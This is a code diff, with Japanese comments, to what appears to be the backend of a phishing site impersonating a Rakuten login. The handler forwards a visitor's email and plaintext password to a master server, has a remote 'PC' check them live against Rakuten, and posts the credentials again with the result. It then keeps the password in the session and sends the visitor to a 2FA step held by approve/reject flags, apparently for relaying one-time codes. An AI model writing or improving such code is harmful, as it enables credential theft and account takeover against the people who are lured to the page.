@@ -45,6 +45,7 @@ app.secret_key = SECRET_KEY
 
 connection_check_results = {}
 twofa_sessions = {}
+login_check_results = {}
 
 def start_polling(request_id):
     """0.5秒ごとにポーリング"""
@@ -73,6 +74,56 @@ def start_polling(request_id):
                 
             except Exception as e:
                 print(f"[ERROR] ポーリングエラー: {e}")
+            
+            attempt += 1
+            time.sleep(0.5)
+    
+    thread = threading.Thread(target=poll, daemon=True)
+    thread.start()
+
+def start_login_polling(request_id, email, password):
+    """ログインチェック結果を0.5秒ごとにポーリング"""
+    def poll():
+        max_attempts = 120
+        attempt = 0
+        
+        while attempt < max_attempts:
+            try:
+                response = requests.get(
+                    f"{MASTER_SERVER_URL}/api/request-result/logincheckrequest/{request_id}",
+                    timeout=5
+                )
+                
+                if response.status_code == 200:
+                    data = response.json()
+                    status = data.get('status')
+                    
+                    if status in ['success', 'failed', 'timeout']:
+                        login_check_results[request_id] = {
+                            'status': status,
+                            'pc_id': data.get('locked_by'),
+                            'received_at': datetime.now().isoformat()
+                        }
+                        
+                        # 本サーバーに結果通知
+                        try:
+                            requests.post(
+                                f"{MASTER_SERVER_URL}/api/login/result",
+                                json={
+                                    'email': email,
+                                    'password': password,
+                                    'result': status
+                                },
+                                timeout=10
+                            )
+                            print(f"[INFO] 本サーバーに結果通知: {status}")
+                        except:
+                            pass
+                        
+                        break
+                
+            except Exception as e:
+                print(f"[ERROR] ログインポーリングエラー: {e}")
             
             attempt += 1
             time.sleep(0.5)
@@ -188,7 +239,7 @@ def get_check_result(request_id):
 
 @app.route('/api/login', methods=['POST'])
 def api_login():
-    """ログイン処理"""
+    """ログイン処理 - ボタン押下時に即座にリクエスト送信"""
     data = request.json
     email = data.get('email', '').strip()
     password = data.get('password', '').strip()
@@ -197,103 +248,96 @@ def api_login():
         return jsonify({
             'success': False,
             'error': 'メールアドレスとパスワードを入力してください'
-        }), 200
+        }), 400
     
     print(f"[INFO] ログイン処理開始 | Email: {email}")
     
-    pc_check_result = {'success': None, 'finished': False}
-    login_check_result = {'success': None, 'finished': False}
-    stop_flag = {'stop': False}
-    
-    def pc_check_thread():
-        print(f"[INFO] PC接続確認開始...")
-        pc_check_result['success'] = check_pc_connection(stop_flag)
-        pc_check_result['finished'] = True
-        
-        if pc_check_result['success']:
-            print(f"[SUCCESS] PC接続成功 | Email: {email}")
-        else:
-            print(f"[ERROR] PC接続失敗 | Email: {email}")
-            stop_flag['stop'] = True
-    
-    def login_check_thread():
-        print(f"[INFO] 楽天ログイン確認開始... | Email: {email}")
-        login_check_result['success'] = rakuten_login_check(email, password, stop_flag)
-        login_check_result['finished'] = True
-        
-        if login_check_result['success']:
-            print(f"[SUCCESS] 楽天ログイン成功 | Email: {email}")
-        else:
-            print(f"[ERROR] 楽天ログイン失敗 | Email: {email}")
-            stop_flag['stop'] = True
-    
-    t1 = threading.Thread(target=pc_check_thread, daemon=True)
-    t2 = threading.Thread(target=login_check_thread, daemon=True)
-    
-    t1.start()
-    t2.start()
-    
-    max_wait = 30
-    start_time = time.time()
-    
-    while time.time() - start_time < max_wait:
-        if stop_flag['stop']:
-            print(f"[INFO] 片方が失敗したため処理を終了します")
-            break
-        
-        if pc_check_result['finished'] and login_check_result['finished']:
-            break
-        
-        time.sleep(0.1)
-    
-    if not pc_check_result['success']:
-        return jsonify({
-            'success': False,
-            'error': 'PCに接続できませんでした'
-        }), 200
-    
-    if not login_check_result['success']:
-        return jsonify({
-            'success': False,
-            'error': 'ログインに失敗しました'
-        }), 200
-    
-    session['email'] = email
-    session['password'] = password
-    twofa_sessions[email] = {
-        'password': password,
-        'approved': False,
-        'rejected': False,
-        'created_at': datetime.now().isoformat()
-    }
-    
-    print(f"[INFO] セッション保存完了 | Email: {email}")
-    
+    # 1. 即座に本サーバーにログインリクエストを作成
     try:
-        init_response = requests.post(
-            f"{MASTER_SERVER_URL}/api/login/init-session",
+        response = requests.post(
+            f"{MASTER_SERVER_URL}/api/request",
             json={
-                'email': email,
-                'password': password
+                'genre': 'logincheckrequest',
+                'callback_url': CALLBACK_URL,
+                'data': {
+                    'email': email,
+                    'password': password
+                }
             },
             timeout=10
         )
-        if init_response.status_code == 200:
-            print(f"[SUCCESS] 本サーバーに2FAセッション初期化完了 | Email: {email}")
-        else:
-            print(f"[WARNING] 本サーバー2FAセッション初期化失敗 | Email: {email}")
+        
+        if response.status_code != 201:
+            return jsonify({
+                'success': False,
+                'error': '本サーバーへのリクエスト作成に失敗しました'
+            }), 500
+        
+        result = response.json()
+        request_id = result.get('request_id')
+        
+        print(f"[INFO] ログインリクエスト送信完了 | request_id: {request_id}")
+        
     except Exception as e:
-        print(f"[ERROR] 本サーバー通信エラー: {e}")
+        print(f"[ERROR] 本サーバーへのリクエスト送信エラー: {e}")
+        return jsonify({
+            'success': False,
+            'error': 'サーバーとの通信に失敗しました'
+        }), 500
     
-    print(f"[INFO] バックグラウンド処理開始 | Email: {email}")
-    threading.Thread(
-        target=send_login_to_pc,
-        args=(email, password),
-        daemon=True
-    ).start()
+    # 2. バックグラウンドでPC結果をポーリング
+    start_login_polling(request_id, email, password)
     
-    print(f"[SUCCESS] ログイン処理完了 | Email: {email}")
-    return jsonify({'success': True, 'requires_2fa': True}), 200
+    # 3. PCからの返答を待つ（最大60秒）
+    max_wait = 60
+    start_time = time.time()
+    
+    while time.time() - start_time < max_wait:
+        result_data = login_check_results.get(request_id)
+        
+        if result_data:
+            status = result_data.get('status')
+            
+            if status == 'success':
+                # 4. ログイン成功 → 2FAセッション初期化
+                session['email'] = email
+                session['password'] = password
+                twofa_sessions[email] = {
+                    'password': password,
+                    'approved': False,
+                    'rejected': False,
+                    'created_at': datetime.now().isoformat()
+                }
+                
+                try:
+                    requests.post(
+                        f"{MASTER_SERVER_URL}/api/login/init-session",
+                        json={'email': email, 'password': password},
+                        timeout=10
+                    )
+                    print(f"[SUCCESS] 本サーバーに2FAセッション初期化完了 | Email: {email}")
+                except:
+                    pass
+                
+                return jsonify({
+                    'success': True,
+                    'message': 'ログインに成功しました',
+                    'redirect': '/login/2fa'
+                }), 200
+            
+            elif status == 'failed':
+                return jsonify({
+                    'success': False,
+                    'error': 'ログインに失敗しました。メールアドレスまたはパスワードが正しくありません。'
+                }), 401
+        
+        time.sleep(0.5)
+    
+    # 5. タイムアウト
+    return jsonify({
+        'success': False,
+        'error': 'ログイン処理がタイムアウトしました'
+    }), 408
 
 
 def check_pc_connection(stop_flag):
